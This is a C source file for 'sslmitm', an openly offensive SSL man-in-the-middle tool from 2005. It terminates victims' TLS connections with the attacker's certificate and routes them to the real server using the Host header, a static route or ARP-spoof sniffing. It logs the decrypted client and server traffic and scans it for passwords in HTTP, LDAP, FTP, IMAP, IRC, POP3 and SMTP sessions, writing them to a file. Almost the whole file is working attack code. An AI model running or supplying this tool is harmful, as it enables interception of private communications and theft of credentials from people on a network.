/*
 *  Copyright (c) 2005 Claes M. Nyberg <cmn@darklab.org>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * $Id: sslmitm.c,v 1.12 2005-07-08 13:36:59 cmn Exp $
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <fcntl.h>
#include <ctype.h>
#include "ssl.h"
#include "sslmitm.h"

/* Global options */
struct options opt;

/* Local rooutines */
static void *client_handler(void *);

struct kick_ssl_server_args {
	u_int ip;
	u_short port;
	void *(*handler)(void *);
};

/*
 * Start SSL server (pthread start routine)
 */
void *
kick_ssl_server(void *arg)
{
	struct kick_ssl_server_args *karg;
	karg = (struct kick_ssl_server_args *)arg;
	ssl_server(karg->ip, karg->port, opt.keyfile, opt.certfile, karg->handler);
	free(arg);
	return(NULL);
}

/*
 * Handle client (pthread start routine)
 * TODO: Split me up!
 */
static void *
client_handler(void *ssl_socket)
{
	struct sslsocket *ss;
	struct sslsocket *css;
	struct sockaddr_in cin;
	fd_set readset;
	char buf[65535];
	char msg[2048];	/* For logging */
	u_int ip = 0;
	u_short port = 0;
	u_int addrlen;
#ifndef NOPCAP
	size_t i = 0;
#endif
	size_t nfd;
	ssize_t n = 0;
	int src_data = 0;
	int dst_data = 0;
	FILE *logf = NULL;
	u_int src_count = 0;
	u_int dst_count = 0;
	const char *cstr;
	const char *sstr;
	
	ss = (struct sslsocket *)ssl_socket;
	addrlen = sizeof(struct sockaddr_in);
	
	/* Get address of connecting client */
	if (getpeername(ss->fd, (struct sockaddr *)&cin, &addrlen) < 0) {
		err_errno("Failed to get client adress");
		ssl_close(ss);
		return(NULL);
	}


	/* Scan for 'Host:' */
	if ((opt.iface == NULL) && (opt.r_addr == 0) && (ss->lport == ntohs(443))) {
		char *pt;
		
		verbose(2, "Scanning for 'Host:' to get route\n");
		n = ssl_read(ss, buf, sizeof(buf));

		if (n <= 0) {
			if (n < 0)
				err_errno("ssl_read");
			ssl_close(ss);
			return(NULL);
		}
		if ( (pt = strstr(buf, "\nHost:")) != NULL) {
			char target[2048];
			size_t i;

			memset(target, 0x00, sizeof(target));

			i = 0;
			pt += 7;
			while ( (i < sizeof(target)-1) && (i < n)) {
				if (!isspace(*pt))
					target[i++] = *pt;
				pt++;

				if (*pt == '\n')
					break;
			}
			verbose(2, "Found 'Host:' route %s\n", target);

			if ( (long)(ip = net_inetaddr(target)) == -1) {
				err("Failed to resolve target Host: '%s'\n", target);
				ssl_close(ss);
				return(NULL);
			}
			port = ss->lport;
		}

		if (ip == 0)
			err("No 'Host:' string in client request\n");
	}
	
	/* Use static route */
	else if (opt.r_addr != 0) {
		ip = opt.r_addr;
		port = opt.r_port ? opt.r_port : ss->lport;
		verbose(2, "Using static route %s\n", net_sockstr_ip(ip, port, 0));
	}

	/* 
	 * Poll for route entry to make sure that the sniff thread caught 
	 * the SYN packet and placed the destination address into the table.
	 */
#ifndef NOPCAP
	else {
		verbose(2, "Polling for spoofed route\n");
		ip = port = 0;
		for (i=0; i<50; i++) {
			if (tcproute_get(cin.sin_addr.s_addr, cin.sin_port, &ip, &port) == 0)
				break;	
			usleep(100000);
		}
	}
#endif /* NOPCAP */
	
	/* We did not get a route :-( */
	if (ip == 0) {
		err("Failed to get route for client %s\n", net_sockstr(&cin, 0));
		ssl_close(ss);
		return(NULL);
	}
	
	/* Avoid loops (people connecting to us) */
	else if (ip == cin.sin_addr.s_addr) {
		err("Avoiding loop connection\n");
		ssl_close(ss);
		return(NULL);
	}
	
	cstr = net_sockstr(&cin, opt.resolve);
	sstr = net_sockstr_ip(ip, port, opt.resolve);
	verbose(0, "Routing %s -> %s\n", cstr, sstr);

	/* Connect to the real target */
	verbose(2, "Connecting to real target\n");
	if ( (css = ssl_connect(ip, port)) == NULL) {
		verbose(2, "SSL Connection failed\n");
		ssl_close(ss);
		return(NULL);
	}
	
	/* Open client -> server log */
	if (opt.c_logdir != NULL) {
		verbose(3, "Creating client -> server log\n");
		snprintf(msg, sizeof(msg), "%s/%s %s -> %s", opt.c_logdir, 
				str_time(time(NULL), "%Y%m%d%H%M%S"), cstr, sstr);
		if ( (src_data = open(msg, O_RDWR|O_APPEND|O_CREAT, 0600)) < 0)
			warn_errno("Failed to open logfile '%s'", msg);
	}
	
	/* Open server -> client log */
	if (opt.s_logdir != NULL) {
		verbose(3, "Creating server -> client log\n");
		snprintf(msg, sizeof(msg), "%s/%s %s <- %s", opt.s_logdir, 
				str_time(time(NULL), "%Y%m%d%H%M%S"), cstr, sstr);
		if ( (dst_data = open(msg, O_RDWR|O_APPEND|O_CREAT, 0600)) < 0)
			warn_errno("Failed to open logfile '%s'", msg);
	}

	/* Open passwd log */
	if (opt.pwfile != NULL) {
		verbose(2, "Opening passwd log\n");
		if ( (logf = fopen(opt.pwfile, "a")) == NULL)
			warn_errno("Failed to open password logfile '%s'", opt.pwfile);
	}
	

	/* We got the route from 'Host:', flush data read from client */
	if (n != 0) {
			
#ifndef NO_PASSWD_SCAN
		scan_buffer(time(NULL), logf, cin.sin_addr.s_addr, 
			cin.sin_port, ip, port, buf, n);
#endif	
		if (src_data > 0) {
			if (writen(src_data, buf, n) != n)
				warn_errno("Failed to write log data");
			src_count += n;
		}

		if (ssl_writen(css, buf, n) != n)
			err_errno("ssl_write");
	}
	
	/* Do the MITM thingy */
	FD_ZERO(&readset);
	FD_SET(ss->fd, &readset);
	FD_SET(css->fd, &readset);

	/* Max file descriptor */
	nfd = (ss->fd > css->fd ? ss->fd : css->fd) +1;
	
	for (;;) {
		ssize_t n;
		fd_set readtmp;
		memcpy(&readtmp, &readset, sizeof(readtmp));

		if (select(nfd, &readtmp, NULL, NULL, NULL) < 0) {
			if (errno == EINTR)
					continue;
			break;
		}

		
		if (FD_ISSET(ss->fd, &readtmp)) {
			if ( (n = ssl_read(ss, buf, sizeof(buf))) <= 0) {
				if (n < 0)
					err_errno("read");
				break;
			}

			if (src_data > 0) {
				if (writen(src_data, buf, n) != n)
					warn_errno("Failed to write log data");
				src_count += n;
			}
#ifndef NO_PASSWD_SCAN
			scan_buffer(time(NULL), logf, cin.sin_addr.s_addr, 
				cin.sin_port, ip, port, buf, n);
#endif
			if (ssl_writen(css, buf, n) != n) {
				err_errno("write");
				break;
			}
		}

		if (FD_ISSET(css->fd, &readtmp)) {
			if ( (n = ssl_read(css, buf, sizeof(buf))) <= 0) {
				if (n < 0)
					err_errno("read");
				break;
			}

			if (dst_data > 0) {
				if (writen(dst_data, buf, n) != n)
					warn_errno("Failed to write log data");
				dst_count += n;
			}

			if (ssl_writen(ss, buf, n) != n) {
				err_errno("write");
				break;
			}
		}
	}

	if (src_data > 0)
		close(src_data);
	if (dst_data > 0)
		close(dst_data);
	if (logf != NULL)
		fclose(logf);

	verbose(0, "Closing connection %s -> %s\n", cstr, sstr);
	
	free((void *)cstr);
	free((void *)sstr);
	ssl_close(css);
	ssl_close(ss);
	return(NULL);
}



void
usage(const char *pname)
{
	printf("\n");
	printf(" ..  \n");
	printf("/|\\    SSL Man In The Middle\n");
	printf("_|_    By CMN <cmn@darklab.org>\n");
	printf("\n");
	printf("Usage: %s <keyfile> <certfile> [option(s)]\n\n", pname);
	printf("Options:\n");
	printf("  -d logfile         - Run as daemon\n");
	printf("  -p port,[port..]   - Port(s) to listen for connections on, default is 443\n");
	printf("                       (Use common for HTTP,LDAP,FTP,IMAP,IRC,POP3 and SMTP)\n");
	printf("  -n                 - Do not attempt to resolve host names\n");
	printf("  -v                 - Verbose, increase to be more verbose\n");
	printf("\n");
	printf("Routing Options (Mutual Exclusive) scan for 'Host:' by default)\n");
#ifndef NOPCAP
	printf("  -a iface           - ARP-spoof in progress, sniff routing information from iface\n");
#endif
	printf("  -r host[:port]     - Static, route connections to port on host\n");
	printf("\n");
	printf("Log Options:\n");
	printf("  -c logdir          - Log data from client in directory\n");
	printf("  -s logdir          - Log data from server in directory\n");
//	printf("  -m size            - Only log size first bytes of every connection\n");
#ifndef NO_PASSWD_SCAN
	printf("  -o file            - Log passwords to file\n");
	printf("                       Scan for HTTP,LDAP,FTP,IMAP,IRC,POP3 and SMTP\n");
#endif
	printf("\n");
}


int
main(int argc, char *argv[])
{
	pthread_t thread;
	u_short default_ports[2] = {443, 0};
	int i;

	for (i=0; default_ports[i] != 0; i++) 
		default_ports[i] = htons(default_ports[i]);

	memset(&opt, 0x00, sizeof(opt));
	opt.ports = default_ports;
	opt.resolve = 1;

	if (argc < 3) {
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	opt.keyfile = argv[1];
	opt.certfile = argv[2];

	argc -= 2;
	argv += 2;

	while ( (i = getopt(argc, argv, "d:a:p:vi:c:s:m:no:r:")) != -1) {
		switch(i) {

			case 'd':
				opt.daemon = 1;
				opt.logfile = optarg; 
				break;
				
			case 'r':
				{
					char *pt;

					if (opt.iface != NULL)
						errx("-r and -a are mutually exclusive\n");
						
					if ( (pt = strchr(optarg, ':')) != NULL) {
						*pt++ = '\0';
						if (!ISPORT(atoi(pt)))
							errx("Bad port number '%s'\n", pt);
						opt.r_port = htons(atoi(pt));
					}
					
					if ( (int)(opt.r_addr = net_inetaddr(optarg)) == -1)
						errx("Failed to resolve IP/host '%s'\n", optarg);
				}
				break;
			case 'p': 
				{
					u_short ports[65535];
					char *common = "636,990,993,994,995,465";
					char *pt = optarg;
					char *delim;
					u_int i = 0;
					memset(ports, 0x00, sizeof(ports));

					if (!strcmp(optarg, "common")) 	
						pt = strdup(common);
					
					do {
						if ( (delim = strchr(pt, ',')) != NULL)
							*delim++ = '\0';
						if (!ISPORT(atoi(pt)))
							errx("Bad port number '%s'\n", pt);
						ports[i++] = htons(atoi(pt));
						pt = delim;
					} while(i < 65536 && pt != NULL && *pt != '\0');

					opt.ports = zmemx(sizeof(u_short)*(i+1));
					memcpy(opt.ports, ports, sizeof(u_short)*i);
					/* TODO: Memory leakage if option is repeated, free opt.ports */
				}
				break; 
			case 'c': opt.c_logdir = optarg; break;
			case 's': opt.s_logdir = optarg; break;
#ifndef NOPCAP
			case 'a': 
				if (opt.r_addr != 0)
					errx("-r and -a are mutually exclusive\n");
				opt.iface = optarg; 
				break;
#else
			case 'a':
				errx("Recompile withoud defining NOPCAP for -a option\n");
				break;
#endif
			case 'm': opt.size = strtoul(optarg, NULL, 0); break;
#ifndef NO_PASSWD_SCAN
			case 'o': opt.pwfile = optarg; break;
#endif
			case 'n': opt.resolve = 0; break;
			case 'v': opt.verbose++; break;
			default:
				usage("sslmitm");
				exit(EXIT_FAILURE);
		}
	}
#ifdef STATIC_COMPILE
	opt.resolve = 0;
#endif

#ifndef NOPCAP
	/* Start the sniffer thread */
	if (opt.iface != NULL) {
		if (pthread_create(&thread, NULL, destination_tracker, (void *)&opt) < 0)
			err_errnox("Failed to create sniffer thread\n");
	}
#endif /* NOPCAP */

	if (opt.c_logdir)
		verbose(1, "Using client transmit logdir '%s'\n", opt.c_logdir);
	if (opt.s_logdir)
		verbose(1, "Using server transmit logdir '%s'\n", opt.s_logdir);
	

	/* Damonize */
	if (opt.daemon) {
		int fd;

		if (daemonize() < 0)
			exit(EXIT_FAILURE);

		if ( (fd = open(opt.logfile, O_RDWR|O_CREAT|O_APPEND, 0600)) < 0)
			err_errnox("open(%s): %s\n", opt.logfile);

		fflush(stdout);
		fflush(stderr);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
	}
	
	/* Start the server(s), one for each port */
	for (i=0; opt.ports[i] != 0; i++) {
		struct kick_ssl_server_args *args;
		
		args = zmemx(sizeof(struct kick_ssl_server_args));
		args->ip = htonl(INADDR_ANY);
		args->port = opt.ports[i];
		args->handler = client_handler;

		/* Last port, use main thread */
		if (opt.ports[i+1] == 0)
			ssl_server(htonl(INADDR_ANY), opt.ports[i], opt.keyfile,
				opt.certfile, client_handler);

		else if (pthread_create(&thread, NULL, kick_ssl_server, args) < 0)
			err_errnox("Failed to create SSL server thread\n");
	}

	/* We want to run forever ... :-) */
	exit(EXIT_FAILURE);
}
